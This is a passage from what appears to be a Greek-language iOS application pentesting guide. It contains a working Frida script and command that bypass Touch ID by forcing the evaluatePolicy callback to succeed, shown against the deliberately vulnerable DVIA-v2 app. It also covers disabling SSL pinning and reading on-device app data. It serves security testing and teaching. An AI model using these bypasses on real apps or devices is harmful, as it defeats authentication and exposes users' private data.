} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Για να επιτευχθεί το **bypass** του Local Authentication, γράφεται ένα Frida script. Αυτό το script στοχεύει τον έλεγχο **evaluatePolicy**, παρεμβαίνοντας στο callback του για να διασφαλίσει ότι επιστρέφει **success=1**. Αλλάζοντας τη συμπεριφορά του callback, ο έλεγχος αυθεντικοποίησης παρακάμπτεται αποτελεσματικά.

Το script παρακάτω εγχέεται για να τροποποιήσει το αποτέλεσμα της μεθόδου **evaluatePolicy**. Αλλάζει το αποτέλεσμα του callback ώστε να υποδεικνύει πάντα επιτυχία.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Για να εγχυθεί το Frida script και να παρακαμφθεί η βιομετρική πιστοποίηση, χρησιμοποιείται η ακόλουθη εντολή:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Έκθεση Ευαίσθητης Λειτουργικότητας μέσω IPC

### Custom URI Handlers / Deeplinks / Custom Schemes


{{#ref}}
ios-custom-uri-handlers-deeplinks-custom-schemes.md
{{#endref}}

### Universal Links


{{#ref}}
ios-universal-links.md
{{#endref}}

### UIActivity Sharing


{{#ref}}
ios-uiactivity-sharing.md
{{#endref}}

### UIPasteboard


{{#ref}}
ios-uipasteboard.md
{{#endref}}

### App Extensions


{{#ref}}
ios-app-extensions.md
{{#endref}}

### WebViews


{{#ref}}
ios-webviews.md
{{#endref}}

### Serialisation and Encoding


{{#ref}}
ios-serialisation-and-encoding.md
{{#endref}}

## Δικτυακή Επικοινωνία

Είναι σημαντικό να ελέγξετε ότι δεν γίνεται καμία επικοινωνία χωρίς κρυπτογράφηση και επίσης ότι η εφαρμογή επαληθεύει σωστά το πιστοποιητικό TLS του server.\
Για να ελέγξετε αυτού του είδους τα ζητήματα μπορείτε να χρησιμοποιήσετε έναν proxy όπως το **Burp**:


{{#ref}}
burp-configuration-for-ios.md
{{#endref}}

### Έλεγχος hostname

Ένα κοινό πρόβλημα κατά την επαλήθευση του πιστοποιητικού TLS είναι ότι ελέγχεται αν το πιστοποιητικό έχει υπογραφεί από μια **trusted** **CA**, αλλά **δεν ελέγχεται** αν **το hostname** του πιστοποιητικού είναι το hostname που προσπελαύνεται.\
Για να ελέγξετε αυτό το ζήτημα με χρήση του Burp, αφού εμπιστευτείτε την Burp CA στο iPhone, μπορείτε να **δημιουργήσετε ένα νέο πιστοποιητικό με το Burp για διαφορετικό hostname** και να το χρησιμοποιήσετε. Αν η εφαρμογή εξακολουθεί να λειτουργεί, τότε υπάρχει ευπάθεια.

### Certificate Pinning

Αν μια εφαρμογή χρησιμοποιεί σωστά SSL Pinning, τότε η εφαρμογή θα λειτουργεί μόνο αν το πιστοποιητικό είναι αυτό που αναμένεται. Κατά τη δοκιμή μιας εφαρμογής **αυτό μπορεί να αποτελεί πρόβλημα καθώς το Burp θα σερβίρει το δικό του πιστοποιητικό.**\
Για να παρακάμψετε αυτήν την προστασία σε μια jailbroken συσκευή, μπορείτε να εγκαταστήσετε την εφαρμογή [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ή να εγκαταστήσετε [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Μπορείτε επίσης να χρησιμοποιήσετε το **objection** με την εντολή `ios sslpinning disable`

## Διάφορα

- Στο **`/System/Library`** μπορείτε να βρείτε τα frameworks που είναι εγκατεστημένα στη συσκευή και χρησιμοποιούνται από συστημικές εφαρμογές
- Οι εφαρμογές που έχουν εγκατασταθεί από το App Store βρίσκονται μέσα στο **`/User/Applications`**
- Και το **`/User/Library`** περιέχει δεδομένα που αποθηκεύονται από εφαρμογές σε επίπεδο χρήστη
- Μπορείτε να έχετε πρόσβαση στο **`/User/Library/Notes/notes.sqlite`** για να διαβάσετε τις σημειώσεις που έχουν αποθηκευτεί μέσα στην εφαρμογή.
- Μέσα στο φάκελο μιας εγκατεστημένης εφαρμογής (**`/User/Applications/<APP ID>/`**) μπορείτε να βρείτε κάποια ενδιαφέροντα αρχεία:
- **`iTunesArtwork`**: Το εικονίδιο που χρησιμοποιεί η εφαρμογή
- **`iTunesMetadata.plist`**: Πληροφορίες της εφαρμογής που χρησιμοποιούνται στο App Store
- **`/Library/*`**: Περιέχει τις προτιμήσεις και την cache. Στο **`/Library/Cache/Snapshots/*`** μπορείτε να βρείτε το snapshot που πραγματοποιείται στην εφαρμογή πριν αυτή σταλεί στο background.

### Hot Patching/Enforced Updateing

Οι προγραμματιστές μπορούν απομακρυσμένα να **patch-άρουν όλες τις εγκαταστάσεις της εφαρμογής τους άμεσα** χωρίς να χρειαστεί να επανυποβάλουν την εφαρμογή στο App Store και να περιμένουν την έγκριση.\
Για αυτόν τον σκοπό συνήθως χρησιμοποιείται [**JSPatch**](https://github.com/bang590/JSPatch)**.** Αλλά υπάρχουν και άλλες επιλογές όπως [Siren](https://github.com/ArtSabintsev/Siren) και [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Αυτός είναι ένας επικίνδυνος μηχανισμός που θα μπορούσε να καταχραστεί από κακόβουλα third party SDKs, επομένως συνιστάται να ελέγξετε ποια μέθοδος χρησιμοποιείται για αυτόματες ενημερώσεις (αν υπάρχει) και να τη δοκιμάσετε.** Μπορείτε να προσπαθήσετε να κατεβάσετε μια προηγούμενη έκδοση της εφαρμογής για αυτόν τον σκοπό.

### Third Parties

Μια σημαντική πρόκληση με τα **3rd party SDKs** είναι η **έλλειψη λεπτομερούς ελέγχου** πάνω στις λειτουργίες τους. Οι προγραμματιστές αντιμετωπίζουν μια επιλογή: είτε ενσωματώνουν το SDK και αποδέχονται όλες τις λειτουργίες του, συμπεριλαμβανομένων πιθανών ευπαθειών ασφαλείας και θεμάτων ιδιωτικότητας, είτε αποφεύγουν πλήρως τα οφέλη του. Συχνά, οι προγραμματιστές δεν μπορούν οι ίδιοι να επιδιορθώσουν ευπάθειες εντός αυτών των SDKs. Επιπλέον, καθώς τα SDKs αποκτούν εμπιστοσύνη στην κοινότητα, κάποια μπορεί να αρχίσουν να περιέχουν malware.

Οι υπηρεσίες που παρέχονται από third-party SDKs μπορεί να περιλαμβάνουν παρακολούθηση συμπεριφοράς χρηστών, εμφάνιση διαφημίσεων ή βελτιώσεις στην εμπειρία χρήστη. Ωστόσο, αυτό εισάγει τον κίνδυνο οι προγραμματιστές να μην είναι πλήρως ενήμεροι για τον κώδικα που εκτελούν αυτές οι βιβλιοθήκες, οδηγώντας σε πιθανούς κινδύνους ιδιωτικότητας και ασφάλειας. Είναι κρίσιμο να περιοριστούν οι πληροφορίες που μοιράζονται με υπηρεσίες τρίτων στο απαραίτητο και να διασφαλιστεί ότι δεν εκτίθενται ευαίσθητα δεδομένα.

Η υλοποίηση υπηρεσιών τρίτων συνήθως γίνεται με δύο μορφές: μια αυτόνομη βιβλιοθήκη ή ένα πλήρες SDK. Για να προστατευθεί η ιδιωτικότητα των χρηστών, οποιοδήποτε δεδομένο μοιράζεται με αυτές τις υπηρεσίες θα πρέπει να **απoπροσωποποιείται** ώστε να αποφεύγεται η αποκάλυψη Personal Identifiable Information (PII).

Για να εντοπίσετε τις βιβλιοθήκες που χρησιμοποιεί μια εφαρμογή, μπορείτε να χρησιμοποιήσετε την εντολή **`otool`**. Αυτό το εργαλείο θα πρέπει να τρέξει πάνω στην εφαρμογή και σε κάθε shared library που χρησιμοποιεί για να ανακαλύψετε πρόσθετες βιβλιοθήκες.
```bash
otool -L <application_path>
```
## Ενδιαφέρουσες Ευπάθειες & Μελέτες Περίπτωσης


{{#ref}}
air-keyboard-remote-input-injection.md
{{#endref}}

{{#ref}}
itunesstored-bookassetd-sandbox-escape.md
{{#endref}}

## **Αναφορές & Πρόσθετοι Πόροι**

- [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
- [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
- [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
- [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
- [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
- [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
- [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS δωρεάν μάθημα([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
- [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
- [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
- [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
- [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
- [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
- OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< έκδοση Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< έκδοση Swift
- [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
- [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)


{{#include ../../banners/hacktricks-training.md}}
